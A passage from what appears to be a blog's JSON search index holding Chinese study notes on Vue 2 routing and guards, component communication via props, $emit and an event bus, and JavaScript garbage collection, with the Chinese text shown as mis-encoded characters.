&lt;h2&gt;æˆ‘æ˜¯æ–‡æ¡£æ–‡ä»¶&lt;/h2&gt;    &lt;p&gt;params: { { $ route.params }}'&lt;/p&gt;    &lt;p&gt;query:  { { $ route.query }}&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;JavaScriptä»£ç æ–¹å¼export default {  name: 'Home',  mounted() {    // è·å–è·¯å¾„å‚æ•° paramsæ–¹å¼    const id = this.$route.params.id;    console.log('è·¯å¾„å‚æ•° id:', id);          // è·å–æŸ¥è¯¢å‚æ•° query æ–¹å¼    const query = this.$route.query.example;    console.log('æŸ¥è¯¢å‚æ•° example:', query)          // paramsæ–¹å¼ è·³è½¬é¡µé¢    this.$router.push({ name: 'home', params: { id: 123 } });    // queryæ–¹å¼ è·³è½¬é¡µé¢    this.$router.push({ name: 'about', query: { example: 1 } });  },};è·¯ç”±çš„ä¸¤ç§æ¨¡å¼å•é¡µé¢æ¨¡å¼çš„é‡ç‚¹ï¼šæ”¹å˜å‰ç«¯é¡µé¢è€Œä¸ä¼šå‘åç«¯å‘é€è¯·æ±‚æºç è§£æï¼švue-routerå®ç°åŸç†åŠä¸¤ç§æ¨¡å¼åˆ†æ - çŸ¥ä¹ (zhihu.com)hash (é»˜è®¤)window.addEventListener('hashchange', function(){    // ç›‘å¬hashå˜åŒ–ï¼Œç‚¹å‡»æµè§ˆå™¨çš„å‰è¿›åé€€ä¼šè§¦å‘})â€‹\tæ ‡å¿—ç¬¦å· # + hashå€¼  ä¸åŒ…å«åœ¨HTTPè¯·æ±‚ä¸­ï¼Œå¯¹æœåŠ¡å™¨æ— å½±å“  ç”¨ä»¥æŒ‡å¯¼æµè§ˆå™¨åŠ¨ä½œ  æ¯æ¬¡æ”¹å˜hashå€¼éƒ½ä¼šåœ¨æµè§ˆå™¨ç•™ä¸‹è®°å½•historyâ€‹\tä»HTML5å¼€å§‹ï¼ŒHistory interfaceæä¾›äº†ä¸¤ä¸ªæ–°çš„æ–¹æ³•ï¼špushState(), replaceState()ä½¿å¾—æˆ‘ä»¬å¯ä»¥å¯¹æµè§ˆå™¨å†å²è®°å½•æ ˆè¿›è¡Œä¿®æ”¹window.history.pushState(stateObject, title, URL)window.history.replaceState(stateObject, title, URL)      stateObject: å½“æµè§ˆå™¨è·³è½¬åˆ°æ–°çš„çŠ¶æ€æ—¶ï¼Œå°†è§¦å‘popStateäº‹ä»¶ï¼Œè¯¥äº‹ä»¶å°†æºå¸¦è¿™ä¸ªstateObjectå‚æ•°çš„å‰¯æœ¬    title: æ‰€æ·»åŠ è®°å½•çš„æ ‡é¢˜  URL: æ‰€æ·»åŠ è®°å½•çš„URLâ€‹\tå½“è°ƒç”¨ä»–ä»¬ä¿®æ”¹æµè§ˆå™¨å†å²è®°å½•æ ˆåï¼Œè™½ç„¶å½“å‰URLæ”¹å˜äº†ï¼Œä½†æµè§ˆå™¨ä¸ä¼šåˆ·æ–°é¡µé¢ï¼Œè¿™å°±ä¸ºå•é¡µåº”ç”¨å‰ç«¯è·¯ç”±â€œæ›´æ–°è§†å›¾ä½†ä¸é‡æ–°è¯·æ±‚é¡µé¢â€æä¾›äº†åŸºç¡€ã€‚â€‹\tæµè§ˆå™¨å†å²è®°å½•å¯ä»¥çœ‹ä½œä¸€ä¸ªã€Œæ ˆã€ã€‚      ç”¨æˆ·æ¯ç‚¹å¼€ä¸€ä¸ªæ–°ç½‘é¡µï¼Œéƒ½ä¼šåœ¨ä¸Šé¢åŠ ä¸€ä¸ªæ–°ç›˜å­ï¼Œå«ã€Œå…¥æ ˆã€ã€‚        ç”¨æˆ·æ¯æ¬¡ç‚¹å‡»ã€Œåé€€ã€æŒ‰é’®éƒ½ä¼šå–èµ°æœ€ä¸Šé¢çš„é‚£ä¸ªç›˜å­ï¼Œå«åšã€Œå‡ºæ ˆã€ã€‚    è€Œæ¯æ¬¡æµè§ˆå™¨æ˜¾ç¤ºçš„è‡ªç„¶æ˜¯æœ€é¡¶ç«¯çš„ç›˜å­çš„å†…å®¹ã€‚  58é“Vueå¸¸è§é¢è¯•é¢˜é›†é”¦ï¼Œæ¶µç›–å…¥é—¨åˆ°ç²¾é€šï¼Œè‡ªæµ‹ Vue æŒæ¡ç¨‹åº¦åŠ¨æ€è·¯ç”±  æŸç§åŒ¹é…æ¨¡å¼ä¸‹çš„è·¯ç”±ï¼Œæ˜ å°„åˆ°åŒä¸€ä¸ªç»„ä»¶ä¸­  æœ¬è´¨ â€” ä½¿ç”¨ url ä¼ å€¼ï¼Œå†³å®šé¡µé¢æ•°æ®è·¯ç”±å®ˆå«  è·¯ç”±æ‹¦æˆªï¼Œéœ€è¦ç»“åˆmetaæ¥å®ç°  å¼‚æ­¥è§£ææ‰§è¡Œï¼Œæ‰€æœ‰å®ˆå«resolveå®Œä¹‹å‰ä¸€ç›´å¤„äºç­‰å¾…çŠ¶æ€å…¨å±€è·¯ç”±å®ˆå«â€‹\tå®šä¹‰åœ¨main.jsçš„è·¯ç”±å®ä¾‹åŒ–å¯¹è±¡      å…¨å±€ - å‰ç½®å®ˆå«router.beforeEach((to,from,next)=&gt;{})ï¼Œ          è®¿é—®è·¯ç”±å‰è°ƒç”¨      å…è®¸æ”¾è¡Œ next();ï¼Œä¸å…è®¸æ”¾è¡Œnext('/login');æŒ‡å®šå»å“ª            å…¨å±€ - åç½®é’©å­router.afterEach((to,from)=&gt;{}) ï¼Œ          æ¯æ¬¡åˆ‡æ¢è·¯ç”±æ—¶è°ƒç”¨ï¼Œä¸æ¥å—next()ä¹Ÿä¸æ”¹å˜å¯¼èˆªæœ¬èº«      ä¿®æ”¹æ¯ä¸ªé¡µé¢çš„titleï¼Œé€šè¿‡è¯»å–metaä¸­çš„ä¿¡æ¯æ¥ä¿®æ”¹é¡µé¢title      é¡µé¢åˆ‡æ¢çš„æ—¶å€™è®©é¡µé¢æ»šåŠ¨åˆ°æœ€é¡¶éƒ¨      router.afterEach((to, from)=&gt;{    document. title = to. title;     window. scrollTo(0,0);})routerç‹¬äº«å®ˆå«â€‹\tå®šä¹‰åœ¨è·¯ç”±é…ç½®ä¸Šçš„å®ˆå«const router = new VueRouter({routes: [{        path: '/foo',        component: Foo,        beforeEnter: (to, from, next) =&gt;{        // ..        }\t}]})ç»„ä»¶å†…è·¯ç”±å®ˆå«  beforeRouteEnter(ç¬¬ä¸€æ¬¡åˆ›å»ºç»„ä»¶å®ä¾‹å‰)  beforeRouteUpdateï¼ˆåœ¨ç»„ä»¶è¢«å¤ç”¨çš„æ—¶å€™è°ƒç”¨ï¼‰  beforeRouteLeaveï¼ˆç¦»å¼€ç»„ä»¶ï¼‰æƒé™æ§åˆ¶è·¯ç”±å…ƒä¿¡æ¯ï¼ˆmetaï¼‰  to.meta.roles.includes(role) ç›®çš„è·¯ç”±çš„å…ƒè·¯ç”±ä¿¡æ¯ï¼Œæ˜¯å¦åŒ…æ‹¬äº†ç”¨æˆ·çš„è§’è‰²routes: [    {        path: '/login',        name: 'login',        meta: {            roles: ['admin', 'user']        },        component: () =&gt; import('../components/Login.vue')    },    {        path: 'home',        name: 'home',        meta: {            roles: ['admin']        },        component: () =&gt; import('../views/Home.vue')    },]//å‡è®¾æœ‰ä¸¤ç§è§’è‰²ï¼šadmin å’Œ user  //ä»åå°è·å–çš„ç”¨æˆ·è§’è‰²const role = 'user'//å½“è¿›å…¥ä¸€ä¸ªé¡µé¢æ˜¯ä¼šè§¦å‘å¯¼èˆªå®ˆå« router.beforeEach äº‹ä»¶router.beforeEach((to,from,next)=&gt;{\tif(to.meta.roles.includes(role)){\t\tnext()\t//æ”¾è¡Œ\t}esle{\t\tnext({path:\"/404\"})\t//è·³åˆ°404é¡µé¢\t}})åŠ¨æ€åŠ è½½èœå•å’Œè·¯ç”±ï¼ˆaddRoutesï¼‰  addRoutes() åŠ¨æ€æ·»åŠ åœ¨è·¯ç”±è¡¨ä¸­pushè·¯ç”±  æŒ‰é¡ºåºåŒ¹é…ï¼Œ404ç­‰é¡µé¢åŠ¨æ€æ·»åŠ åœ¨åé¢æ ¹æ®ç”¨æˆ·ç™»å½•çš„æƒé™ä¿¡æ¯ï¼Œè·å–æƒé™èœå•ï¼Œä¿å­˜åœ¨storeä¸­"
  },
  
  {
    "title": "ç»„ä»¶äº¤äº’",
    "url": "/posts/%E7%BB%84%E4%BB%B6%E4%BA%A4%E4%BA%92/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-04 00:00:00 +0800",
    





    
    "snippet": "çˆ¶ä¼ å­ propsâ€‹\tçˆ¶ç»„ä»¶ä¼ é€’ç»™å­ç»„ä»¶çš„æ•°æ®ï¼Œå­ç»„ä»¶é€šè¿‡propsæ¥å—åï¼Œä¸èƒ½ç›´æ¥æ›´æ”¹è¯¥å€¼ã€‚è¿™æ˜¯å› ä¸ºï¼š  æ‰€æœ‰çš„ prop éƒ½ä½¿å¾—å…¶çˆ¶å­ prop ä¹‹é—´å½¢æˆäº†ä¸€ä¸ªå•å‘ä¸‹è¡Œç»‘å®šï¼šçˆ¶çº§ prop çš„æ›´æ–°ä¼šå‘ä¸‹æµåŠ¨åˆ°å­ç»„ä»¶ä¸­  ä½†æ˜¯åè¿‡æ¥åˆ™ä¸è¡Œã€‚è¿™æ ·ä¼šé˜²æ­¢ä»å­ç»„ä»¶æ„å¤–å˜æ›´çˆ¶çº§ç»„ä»¶çš„çŠ¶æ€ï¼Œä»è€Œå¯¼è‡´ä½ çš„åº”ç”¨çš„æ•°æ®æµå‘éš¾ä»¥ç†è§£Step 1 â€” çˆ¶äº²å»ºç«‹å…³ç³»import Child from './ch...",
    "content": "çˆ¶ä¼ å­ propsâ€‹\tçˆ¶ç»„ä»¶ä¼ é€’ç»™å­ç»„ä»¶çš„æ•°æ®ï¼Œå­ç»„ä»¶é€šè¿‡propsæ¥å—åï¼Œä¸èƒ½ç›´æ¥æ›´æ”¹è¯¥å€¼ã€‚è¿™æ˜¯å› ä¸ºï¼š  æ‰€æœ‰çš„ prop éƒ½ä½¿å¾—å…¶çˆ¶å­ prop ä¹‹é—´å½¢æˆäº†ä¸€ä¸ªå•å‘ä¸‹è¡Œç»‘å®šï¼šçˆ¶çº§ prop çš„æ›´æ–°ä¼šå‘ä¸‹æµåŠ¨åˆ°å­ç»„ä»¶ä¸­  ä½†æ˜¯åè¿‡æ¥åˆ™ä¸è¡Œã€‚è¿™æ ·ä¼šé˜²æ­¢ä»å­ç»„ä»¶æ„å¤–å˜æ›´çˆ¶çº§ç»„ä»¶çš„çŠ¶æ€ï¼Œä»è€Œå¯¼è‡´ä½ çš„åº”ç”¨çš„æ•°æ®æµå‘éš¾ä»¥ç†è§£Step 1 â€” çˆ¶äº²å»ºç«‹å…³ç³»import Child from './child';componensts: { Child } // å¼•å…¥ç»„ä»¶Step 2 â€” çˆ¶äº²å¼•ç”¨å­ç»„ä»¶&lt;Child :bothSameName=\"inFatherDataVuale\"&gt;&lt;Child&gt;Step 3 â€” å­©å­æ¥å—çˆ¶æ¶ˆæ¯props:{\tbothSameName:{      type: String,      default: undefined    }}Step 4 â€” å­©å­ä½¿ç”¨æ¶ˆæ¯&lt;p&gt;&lt;/p&gt;// çˆ¶ç»„ä»¶&lt;body&gt;    &lt;div&gt;        &lt;son :bothSameValueName=\"inFatherDataVuale\" /&gt;    &lt;/div&gt;&lt;/body&gt;&lt;script&gt;    import son from './son' //å¼•å…¥å­ç»„ä»¶    export default {        name: 'Parent',        components: { son },        data() {            return {                inFatherDataVuale: 'Hi,my sonï¼',            }        }    }&lt;/script&gt;// å­ç»„ä»¶&lt;body&gt;    &lt;div&gt;        &lt;p&gt;çˆ¶äº²è¯´ï¼š &lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;&lt;script&gt;    export default {        name: 'son',        props: {            bothSameValueName: {                type: String,                default: undefined                //required:ture/false  æ˜¯å¦æ˜¯å¿…é¡»çš„            }        },        data() {            return {                inSonDataVuale: this.bothSameValueName            }        }    }&lt;/script&gt;å­ä¼ çˆ¶ $emitStep 1 â€” å­©å­è‡ªå®šä¹‰äº‹ä»¶this.$emit('SonSentToFather',this.number);Step 2 â€” çˆ¶äº²å»ºç«‹è”ç³»import Child from './child';componensts: { Child } // å¼•å…¥ç»„ä»¶Step 3 â€” çˆ¶äº²ä½¿ç”¨å­ç»„ä»¶&lt;Child @SonSentToFather='getNum'&gt;&lt;/Child&gt; // ç»‘å®šçš„äº‹ä»¶åï¼šäº‹ä»¶å›è°ƒå‡½æ•°Step 4 â€” çˆ¶äº²å®šä¹‰å‡½æ•°æ¥å—å‚æ•°methods:{    getNum(val){ this.SonNum = val;}}// çˆ¶ç»„ä»¶&lt;template&gt;\t&lt;son @SonSentToFather=\"getSonNum()\" /&gt;&lt;/template&gt;&lt;script&gt;    import son from './son'    export default {        name: 'first_father',        components: { son },        data() {            return {                SonNum: ''            }        },        methods: {            getSonNum: function (val) {                this.SonNum = val            }        }    }&lt;/script&gt;// å­ç»„ä»¶&lt;template&gt;\t&lt;input type=\"text\" v-model=\"a\" @click=\"setLink\" placeholder=\"ä¼ é€’ç»™ç¬¬ä¸€ä¸ªçˆ¶äº²\"&gt;&lt;/template&gt;&lt;script&gt;    export default {        name: 'son',        data () {            return {                number: 2992            }        },        methods: {            setLink: function () {                this.$emit('SonSentToFather', this.number)            }        }&lt;/script&gt;å­ä¼ çˆ¶ è‡ªå®šä¹‰äº‹ä»¶ä½¿ç”¨åœºæ™¯ï¼šå­ç»„ä»¶ç»™çˆ¶ç»„ä»¶ä¼ å€¼ â€” çˆ¶ç»„ä»¶ç»™å­ç»„ä»¶ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶ï¼Œå­ç»„ä»¶è§¦å‘äº‹ä»¶ï¼Œå›è°ƒå‡½æ•°åœ¨çˆ¶ç»„ä»¶ä¸­      ç»‘å®šäº‹ä»¶ $emit(\"eventName\",parmas)        è§£ç»‘äº‹ä»¶ $off(\"eventName\")        ç›‘å¬äº‹ä»¶ $on(\"eventName\",parmas)  $emitç»™è°ç»‘å®šäº‹ä»¶ï¼Œæ‰¾è°è§¦å‘äº‹ä»¶ï¼Œæ‰¾è°è§£ç»‘äº‹ä»¶$onâ€‹\tåªè§¦å‘ä¸€æ¬¡ $once æˆ–è€… eventName.once  è‡ªå®šä¹‰äº‹ä»¶çš„å›è°ƒå‡½æ•°ï¼ŒthisæŒ‡å‘è¢«ç»‘å®šã€è¢«è§¦å‘çš„ç»„ä»¶  åœ¨å½“å‰ç»„ä»¶è°ƒç”¨methodså®šä¹‰çš„å‡½æ•°æ—¶ï¼Œå·²å½“å‰ç»„ä»¶å‡½æ•°çš„thisä¸ºä¸»  ç”Ÿå‘½å‘¨æœŸé’©å­ä»¥æ™®é€šå‡½æ•°æ–¹å¼å®šä¹‰ï¼Œthisä¸€å®šå–å½“å‰ç»„ä»¶mounted(){    this.$refs.children // è¿™é‡Œçš„thisæŒ‡å‘childrenç»„ä»¶    .$on(\"eventName\",this.getChildrenName) // åœ¨å½“å‰ç»„ä»¶è°ƒç”¨methodså®šä¹‰çš„å‡½æ•°ï¼Œä»¥å½“å‰ç»„ä»¶thisä¸ºä¸»        this.$refs.children // è¿™é‡Œçš„thisæŒ‡å‘childrenç»„ä»¶    .$on(\"eventName\",function(name, ...params){ // æ–°å®šä¹‰çš„å‡½æ•°ï¼ŒæŒ‡åœ¨childrenåªèƒ½å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå‚æ•°å–å€¼éƒ½åœ¨childrenä¸­\t\tconsole.log(this);    })        this.$refs.children // è¿™é‡Œçš„thisæŒ‡å‘childrenç»„ä»¶, å¤–å±‚çš„thisæŒ‡å‘father    .$on(\"eventName\",(name,...params)=&gt;{ // ç®­å¤´å‡½æ•°å¾€å¤–å±‚æ‰¾this        this.sonValueName = name;    })}ã€æ€»ç»“ã€‘ä½¿ç”¨$refä¸ºç»„ä»¶ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶æ—¶ï¼Œå¿…é¡»å…³æ³¨thisçš„æŒ‡å‘ â€” å›è°ƒè¦ä¹ˆé…ç½®åœ¨methodsä¸­ï¼Œè¦ä¹ˆä½¿ç”¨ç®­å¤´å‡½æ•°$off  è§£ç»‘ä¸€ä¸ªthis.$off('eventName');  è§£ç»‘å¤šä¸ª â€” å¿…é¡»å†™åœ¨æ•°ç»„ä¸­this.$off(['eventName1','eventName2']);  è§£ç»‘å…¨éƒ¨this.$off();å…„å¼Ÿé—´ä¼ å€¼ EventBus:warning: å…„å¼Ÿå½¼æ­¤ä¹‹é—´æ²¡æœ‰è”ç³»ï¼Œä½¿ç”¨Vueå®ä¾‹ä½œä¸ºBusæ•°æ®ä¼ é€’Step ï¼‘ â€” å»ºç«‹Busimport Vue from 'vueexport default new Vue()Step ï¼’ â€” å…„å¼Ÿä¸Šè½¦import eventBus from './EventBus\"Step ï¼“ â€” æ¥æ”¶æ–¹é…ç½®created() { // åˆ›å»ºæ—¶å°±æ‰“å¼€é€šé“ï¼Œæˆ– mountedæ—¶åˆ»ç›‘æ§    eventBus.$on('pushMsg', (sendMsg) =&gt; {        this.getMsg = sendMsg;    })}Step ï¼”â€” å‘é€æ–¹é…ç½®methods: {    pushMsg(){        eventBus.$emit('pushMsgTage',this.sendMsg);    }}// å‘é€æ–¹&lt;script&gt;    import eventBus from './EventBus';    export default {        name: 'SendSide',        components: {},        data() {            return {                sendMsg: ''            }        },        methods: {            pushMsg() {                eventBus.$emit('pushMsgTage', this.sendMsg);            }        }    }&lt;/script&gt;// æ¥æ”¶æ–¹&lt;body&gt;    å‘é€æ–¹ ä¼ è¿‡æ¥çš„æ¶ˆæ¯ï¼š &lt;/body&gt;&lt;script&gt;    import eventBus from './EventBus';    export default {        name: 'getSide',        components: {},        data() {            return {                getMsg: ''            }        },        created() {            eventBus.$on('pushMsgTage', (sendMsg) =&gt; {                this.getMsg = sendMsg;            })        }    }&lt;/script&gt;å…„å¼Ÿé—´ä¼ å€¼ å…¨å±€äº‹ä»¶æ€»çº¿ï¼ˆGlobalEventBusï¼‰â€‹\té€‚ç”¨äºä»»æ„ç»„ä»¶é—´çš„é€šä¿¡â‘ æ‰€æœ‰ç»„ä»¶éƒ½èƒ½çœ‹åˆ°å®ƒ  çš„æœ‰ä¸‰ç§ï¼š  window â€” ä¸åº”è¯¥ä¿®æ”¹  VueComponent â€” ä»…ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œéœ€è¦è°ƒç”¨Vue.extendç”Ÿæˆ  vc â€” æ¯æ¬¡ç”Ÿæˆéƒ½æ˜¯ä¸€ä¸ªæ–°çš„å®ä¾‹ï¼Œäº’ä¸å…³è”  Vue  â€” å°†xæ”¾åœ¨ Vueçš„åŸå‹å¯¹è±¡ä¸Š Vue.prototypeVueComponent.prototype._proto_ === Vue.prototype ç»„ä»¶å®ä¾‹å¯¹è±¡Vcå¯ä»¥è®¿é—®åˆ°VueåŸå‹ä¸Šçš„å±æ€§ã€æ–¹æ³•â‘¡å®ƒå¯ä»¥è°ƒç”¨æ‰€æœ‰ç»„ä»¶çš„äº‹ä»¶ï¼š      åŸºç¡€æ•°æ®ç±»å‹ï¼Œä¸å«æ‹¬$on $off $emit        VueComponent â€” vueå®ä¾‹vmæ— æ³•è°ƒç”¨          const Demo = Vue.extend({config})  â€” Demo æ˜¯Vue.extendç”Ÿæˆä¸€ä¸ªVueComponent æ„é€ å‡½æ•°      const demo = new Demo â€” demo æ˜¯é€šè¿‡new åˆ›å»ºçš„vcå®ä¾‹å¯¹è±¡      ç›¸å½“äºåœ¨é¡µé¢ä¸­å¼•å…¥ä¸€ä¸ªç»„ä»¶&lt;vm /&gt;      Vue.prototype.x = demo â€” Vueçš„åŸå‹å¯¹è±¡ä¸Šé…ç½®ä¸€ä¸ªvcå¯¹è±¡ï¼Œæ‹¥æœ‰è°ƒç”¨ç»„ä»¶äº‹ä»¶çš„å‡½æ•°            vueå®ä¾‹                  Vue åˆ›å»ºå‰ç»‘å®šï¼Œæ²¡æœ‰vueå®ä¾‹å¯¹è±¡å¯ä»¥èµ‹å€¼ï¼›Vue åˆ›å»ºå®Œæˆåç»‘å®šï¼Œé¡µé¢å·²ç»å®ŒæˆæŒ‚è½½ï¼Œå­ç»„ä»¶è°ƒç”¨ä¸åˆ°                    Vue beforeCreate()æ—¶ç»‘å®šï¼Œä¸”æŒ‡å‘è‡ªèº«ï¼ˆæ— éœ€æ–°å¢å˜é‡ï¼‰        åˆå§‹åŒ–æ—¶ï¼ŒVueæ•°æ®æ£€æŸ¥ã€æ•°æ®ä»£ç†æœªå¼€å§‹ï¼Œé¡µé¢æœªæŒ‚è½½            â— å®šä¹‰new Vue({    el:\"#app\",    render: h=&gt;h(App),    beforeCreate(){        Vue.prototype.$bus = this // å®‰è£…å…¨å±€äº‹ä»¶æ€»çº¿    }})export default{    name:\"\",    methods:{\t\tsendMsg(){            this.$bus.$emit('hello', name) // åœ¨å…¨å±€äº‹ä»¶æ€»çº¿ä¸Šç»‘å®šäº‹ä»¶ï¼ŒsendMsgè§¦å‘        }    }}â— ä½¿ç”¨mounted(){    this.$bus.$on('hello',(data) =&gt;{ // ç›‘å¬äº‹ä»¶ï¼Œäº‹ä»¶è°ƒç”¨æ”¾åœ¨è°ƒç”¨è€…èº«ä¸Š        console.log('æ¥å—åˆ°æ•°æ®',data)    })    beforeDestroy(){        this.$bus.$off('hello'); // å½“å‰ç»„ä»¶é”€æ¯å‰ï¼Œè§£ç»‘äº‹ä»¶ï¼ˆä¸‹è½¦ï¼ŒæŠŠä½ç½®è®©ç»™åˆ«äººåï¼‰        this.$bus.$off(); // æ¸…ç©ºå…¨å±€äº‹ä»¶æ€»çº¿ ï¼ˆæ•´ä¸ªè½¦å­éƒ½æ²¡æœ‰åº§ä½äº†ï¼‰    }}è·¯ç”±ä¼ å€¼"
  },
  
  {
    "title": "11. åƒåœ¾å›æ”¶æœºåˆ¶",
    "url": "/posts/11.%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/",
    "categories": "JavaScript, Object",
    "tags": "javascriptBase",
    "date": "2022-09-05 00:00:00 +0800",
    





    
    "snippet": "  å›æ”¶å¯¹è±¡ â€”â€” å½“ä¸€ä¸ªå˜é‡æ²¡æœ‰è¢«å…¶ä»–å˜é‡æˆ–å±æ€§å¼•ç”¨çš„æ—¶å€™          å…¨å±€å˜é‡ ï¼šæŒç»­åˆ°æµè§ˆå™¨é¡µé¢å…³é—­      å±€éƒ¨å˜é‡ ï¼šå‡½æ•°æ‰§è¡Œç»“æŸå      æ•°æ®å­˜å‚¨      åŸºæœ¬æ•°æ®ç±»å‹ â€”â€” æ ˆ        å¼•ç”¨æ•°æ®ç±»å‹ â€”â€” å †ï¼Œåœ¨æ ˆä¸­å­˜å‚¨å®é™…å¯¹è±¡å¼•ç”¨    å½“å¼•ç”¨æ•°æ®ç±»å‹å¼•ç”¨ç›®æ ‡æ”¹å˜æ—¶ï¼Œæ—§çš„æ ˆå®é™…å¯¹è±¡å¤±å»å¼•ç”¨ï¼Œè¿™å˜æˆéœ€è¦å›æ”¶çš„åƒåœ¾        ä¸¤ç§å¸¸ç”¨æ–¹æ³•    â€‹\tåƒåœ¾å›...",
    "content": "  å›æ”¶å¯¹è±¡ â€”â€” å½“ä¸€ä¸ªå˜é‡æ²¡æœ‰è¢«å…¶ä»–å˜é‡æˆ–å±æ€§å¼•ç”¨çš„æ—¶å€™          å…¨å±€å˜é‡ ï¼šæŒç»­åˆ°æµè§ˆå™¨é¡µé¢å…³é—­      å±€éƒ¨å˜é‡ ï¼šå‡½æ•°æ‰§è¡Œç»“æŸå      æ•°æ®å­˜å‚¨      åŸºæœ¬æ•°æ®ç±»å‹ â€”â€” æ ˆ        å¼•ç”¨æ•°æ®ç±»å‹ â€”â€” å †ï¼Œåœ¨æ ˆä¸­å­˜å‚¨å®é™…å¯¹è±¡å¼•ç”¨    å½“å¼•ç”¨æ•°æ®ç±»å‹å¼•ç”¨ç›®æ ‡æ”¹å˜æ—¶ï¼Œæ—§çš„æ ˆå®é™…å¯¹è±¡å¤±å»å¼•ç”¨ï¼Œè¿™å˜æˆéœ€è¦å›æ”¶çš„åƒåœ¾        ä¸¤ç§å¸¸ç”¨æ–¹æ³•    â€‹\tåƒåœ¾å›æ”¶å¹¶ä¸æ˜¯å®æ—¶çš„ï¼Œå› ä¸ºå¼€é”€æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥åƒåœ¾å›æ”¶å™¨ä¼šå‘¨æœŸæ€§çš„é‡Šæ”¾ç¨‹åºä¸­å·²ç»ä¸åœ¨è¢«å¼•ç”¨çš„åƒåœ¾å¯¹è±¡ã€‚æµè§ˆå™¨å¸¸ä½¿ç”¨åˆ°ä¸¤ç§æ ‡å‡†ç­–ç•¥ï¼šæ ‡è®°æ¸…ç†ã€å¼•ç”¨è®¡æ•°    1. æ ‡è®°æ¸…é™¤æ³•ï¼ˆå¤§éƒ¨åˆ†æµè§ˆå™¨ï¼‰ Mark-Sweep    ä¸¤ä¸ªé˜¶æ®µï¼š                  æ ‡è®°ï¼šä»æ ¹èŠ‚ç‚¹éå†ï¼Œç»™æ¯ä¸ªå¯è®¿é—®çš„å¯¹è±¡æ‰“ä¸Šæ ‡è®°ï¼Œè¡¨ç¤ºå¯¹è±¡å¯è¾¾        ï¼ˆæ ‡è®°æ‰“æ³•å¯ä»¥æ˜¯ç»´æŠ¤ä¿©ä¸ªâ€œåœ¨ä¸åœ¨ä¸Šä¸‹æ–‡â€çš„å †æ ˆï¼›ä¹Ÿå¯ä»¥æ˜¯æ´»è·ƒæ—¶åè½¬æŸä¸€ä½ï¼Œä¸æ´»è·ƒæ—¶æ¢å¤ï¼‰                    æ¸…é™¤ï¼šåœ¨æ²¡æœ‰å¯ç”¨åˆ†å—ç©ºé—´æ—¶ï¼ˆæˆ–æŸä¸ªå›ºå®šé¢‘ç‡ï¼‰ï¼Œå¯¹å †å†…å­˜éå†ï¼Œå›æ”¶æ²¡æœ‰æ ‡è®°çš„å¯¹è±¡ï¼ˆæ¸…é™¤æ— å¼•ç”¨å¯¹è±¡ï¼‰              ä¼˜ç‚¹ï¼šå®ç°ç®€å•    ç¼ºç‚¹ï¼šå†…å­˜è¿‡äºç¢ç‰‡åŒ–ï¼ˆæ ‡è®°-æ•´ç†æ³•ï¼‰ï¼›åˆ†é…é€Ÿåº¦æ…¢ï¼ˆéå†ï¼‰    ä¼˜åŒ–æ–¹æ¡ˆï¼š**æ ‡è®°-æ•´ç†æ³•  Mark-Compact **    â€‹\tæ¸…é™¤æ—¶å¯¹å †å†…å­˜éå†æ—¶ï¼Œå…ˆå°†è¢«å¼•ç”¨çš„å¯¹è±¡ç§»åŠ¨åˆ°ä¸€èµ·ï¼Œç„¶åå†æ¸…ç†    2. å¼•ç”¨è®¡æ•°æ³• Reference counting    â€‹\tè¿½è¸ªæ¯ä¸ªå˜é‡è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼Œå½“å¼•ç”¨ä¸º0æ—¶å›æ”¶ï¼›ï¼ˆå›æ”¶æ•ˆç‡é«˜ï¼‰ï¼š          èµ‹å€¼ç»™å¼•ç”¨å€¼æ—¶ï¼Œå¼•ç”¨æ•° +1ï¼›      ä¿å­˜å¼•ç”¨çš„å˜é‡è¢«è¦†ç›–äº†ï¼Œå¼•ç”¨æ•° -1        ç¼ºç‚¹ï¼ša è®¡æ•°å™¨çš„å¢å‡å¤„ç†é¢‘ç¹ï¼Œä¼šå¯¼è‡´ç©ºé—´çš„ä½¿ç”¨æ•ˆç‡é™ä½ã€‚    â€ƒâ€ƒâ€ƒb å¾ªç¯å¼•ç”¨æ— æ³•æ”¶å›ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ã€‚    3. å¾ªç¯å¼•ç”¨    åœ¨IE9ä¹‹å‰ï¼Œæ¶‰åŠåˆ°COMå¯¹è±¡ï¼ˆç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼ŒComponent Object Modelï¼‰ï¼Œå°±æ— æ³•é¿å… å¾ªç¯å¼•ç”¨ çš„é—®é¢˜ï¼š          BOM å’Œ DOM ä¸­å¯¹è±¡æ˜¯C++å®ç°çš„COMå¯¹è±¡ï¼Œä½¿ç”¨ å¼•ç”¨è®¡æ•° å®ç°åƒåœ¾å›æ”¶ã€‚å³ä½¿å¼•æ“ä½¿ç”¨ æ ‡å¿—æ¸…ç†ï¼Œè®¾è®¡åˆ°COMå¯¹è±¡ä¾ç„¶å¯èƒ½å½¢æˆå¾ªç¯å¼•ç”¨ï¼Œå³ä½¿åœ¨é¡µé¢ä¸­åˆ é™¤DOMå…ƒç´ å†…å­˜ä¹Ÿä¸€æ ·ã€‚        let element = document.getElementById('one'); // comå¯¹è±¡let obj = new Object() // åŸç”Ÿobjå¯¹è±¡obj.element = element;element.obj = obj;   // é¿å…ï¼šç¡®ä¿ä¸¤è€…æ²¡æœ‰è”ç³»obj.element = null;element.obj = null;        åœ¨IE9ä¹‹åï¼ŒBOM å’Œ DOM å¯¹è±¡éƒ½å˜æˆäº†JavaScriptå¯¹è±¡ï¼Œé¿å…äº†å¾ªç¯å¼•ç”¨é—®é¢˜ï¼ŒåŠå¸¸è§çš„å†…å­˜æ³„éœ²é—®é¢˜ã€‚    åˆ†ä»£å¼åƒåœ¾å›æ”¶æœºåˆ¶          æ–°ç”Ÿä»£ï¼šå¯¹è±¡å­˜æ´»æ—¶é—´çŸ­ï¼Œé€šå¸¸æ”¯æŒ 1~8M      è€ç”Ÿä»£ï¼šå¯¹è±¡å­˜å‚¨ å­˜æ´»æ—¶é—´é•¿ã€å¸¸é©»å†…å­˜çš„å¯¹è±¡        